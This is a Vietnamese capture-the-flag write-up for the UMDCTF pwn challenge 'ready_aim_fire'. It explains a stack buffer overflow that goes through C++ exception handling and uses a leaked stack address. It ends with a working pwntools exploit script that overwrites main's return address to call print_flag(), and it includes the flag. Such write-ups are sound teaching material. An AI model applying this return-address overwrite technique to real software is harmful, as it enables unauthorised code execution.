# Challenge: ready_aim_fire
## Description
![image](https://github.com/sangnguyenthien/CTF/assets/89742084/8f6e1ff9-b5ec-4bcd-85c0-f4e11b7e354c)
## Source
> ready_aim_fire

> ready_aim_fire.cpp

> Dockerfile

## Solution
Hãy kiểm tra file thực thi với checksec

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/bc7c8331-3bae-41d0-a3a8-11b10230ac9e)

Tuyệt vời, không canary, không PIE.

Để xem chúng ta có gì trong file .cpp

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/fe05f5e3-75bb-4285-a0ad-7f65cccb6fdd)

Để ý ở dòng thứ 60, chương trình sẽ in ra địa chỉ của biến cục bộ target_assist -> Leak RBP


Assembly code:

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/b6652a42-5998-4769-89b6-49aeb1dd361c)

Tức là chương trình sẽ in ra rbp-0x14 (với var_14 là -0x14).


OK, tiếp theo hãy xem phần tiếp theo: try catch với hàm fire_weapon():

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/3f77ed4f-1221-46ef-b6c3-3dc551a8014d)

Phần hay ho chính là ở **Canon::fire()**. Nó cho phép chúng ta nhập bao nhiêu tùy thích (cho đến khi gặp kí tự newline).
Khi số kí tự nhập vào lớn hơn 32 thì nó chỉ raise exception, đưa chúng ta về hàm main để xử lí exception chứ không exit chương trình.
Chúng ta có thể lợi dụng lỗi Buffer Overflow này để ghi đè địa chỉ trả về (saved RIP or Return address) của hàm main thành địa chỉ của print_flag().
Ok, hãy thử bằng GDB

Hãy nhập thử 32 kí tự kí tự "a" xem điều gì xảy ra (set breakpoint tại 1 điểm nào đấy trước khi nó trả về hàm main để có thể quan sát stack)
![image](https://github.com/sangnguyenthien/CTF/assets/89742084/9cff1199-2454-446c-8226-f82bc2e5ff93)

Địa chỉ chương trình **leak** ra cho chúng ta (rbp-0x14):
> 0x7ffdf365982c

Bạn có thể thấy LSB của giá trị lưu ở địa chỉ 0x00007ffdf36597e0 (**+0x0040**) là 0x20, tức là 32 kí tự đã nhập vào.
Input của chúng ta sẽ bắt đầu từ **+0x0044** (Viết thế này cho ngắn ^^).
Địa chỉ được leak ra cho chúng ta: **0x7ffdf365982c** sẽ là **+0x008c**
Suy ra cái rbp "của" hàm main chính là **+0x00a0** và return address của hàm main sẽ được lưu ở địa chỉ **+0x00a8**

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/45719a90-9f9c-403c-a4d4-ef12ff468208)


Mục tiêu của chúng ta chính là ghi đè giá trị ở địa chỉ **+0x00a8** thành địa chỉ của hàm **print_flag()** (địa chỉ **0x4023e6**).
Khi làm đến đây thì tôi nghĩ là, thế cần gì phải leak 1 cái địa chỉ (rbp-0x14) như trên nhỉ, chỉ cần dùng gdb để debug xong tính offset để ghi đè là xong.
Nhưng không, đời không như là mơ, khi tôi thử ghi đè: ví dụ 1 đống kí tự "a" cho đến khi đến địa chỉ **+0x00a8**. Bùm, lỗi tùm lum luôn.
Tôi nghĩ là nó còn liên quan đến những hàm khác, những stack frame khác nữa. Ví dụ như ở **+0x0070** và **+0x0078**, nếu tôi ghi đè những byte linh tinh vào đây là không quay về main được :))

Tôi đã từng đọc ở đâu đó nói rằng: Những thứ đề bài cho thì lúc nào cũng có một tác dụng nào đấy, chỉ là mình chưa biết thôi.
Đúng vậy, đã đến lúc tận dụng thứ mà chương trình leak ra cho chúng ta:
> 0x7ffdf365982c

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/aac73669-6dd1-40fa-9b3a-4a885b8c951b)


Bạn có thể debug vài lần để thấy điều này: Những giá trị màu tím (giá trị ở địa chỉ **+0x0068**, **+0x0070** và **+0x0098**) có độ chênh lệch (hmm có thể gọi là offset) không đổi với giá trị được chương trình leak ra.
Ví dụ:
> offset1 = (giá trị tại "**+0x0068**") - leak_addr = 0x7ffdf3659958-0x7ffdf365982c = 0x12c

> offset2 = (giá trị tại "**+0x0070**") - leak_addr = 0x7ffdf3659840-0x7ffdf365982c = 0x14

Với giá trị 0x4026be ở địa chỉ **+0x0078**, là một địa chỉ tĩnh nên không đáng lo.
 Lưu ý là khi remote thì leak_addr sẽ khác nhau nên chúng ta sẽ phải dùng offset để tính toán các giá trị ở các địa chỉ **+0x0068**, **+0x0070** và **+0x0098**

Mục đích là để giữ nguyên các các giá trị "nhạy cảm" trên các địa chỉ này, tránh xảy ra lỗi.

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/d6711859-6097-4fbf-bd8f-59f3d3550aa8)

Dưới đây là chia sẻ của tác giả ^^:

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/fe0ce23d-7ed5-497c-a155-e53ad03b8679)



 Code giải:

 ```python
from pwn import *

#pwn/ready_aim_fire 
#UMDCTF{h0p3fu11y_th3_c++_pwn_w4snt_t00_h0rr1bl3}



context.binary = exe = ELF("./ready_aim_fire")

p = process(exe.path)

#p = remote("challs.umdctf.io", 31008)
p.recvuntil("laser cannon!\n")
leak_address = int(p.recvline()[:-1],16)
print(leak_address)

#payload = b"a"*52+p64(0x48)+(104-60)*b"b"
#payload = b"A"*52 + p64(0x4023E6)
payload = b"a"*36
offset_1 = 0x7ffdf3659958-0x7ffdf365982c
offset_2 = 0x7ffdf3659840-0x7ffdf365982c

overwrite_1 = offset_1 + leak_address
overwrite_2 = offset_2 + leak_address

payload += p64(overwrite_1)
payload += p64(overwrite_2)

payload += p64(0x4026be)

payload += p64(0)
payload += p64(0)
payload += p64(0)

payload += p64(overwrite_1)
payload += p64(0x1)
payload += p64(0x4023E6) ## Address of print_flag()


p.sendline(payload)

p.interactive()
```

 
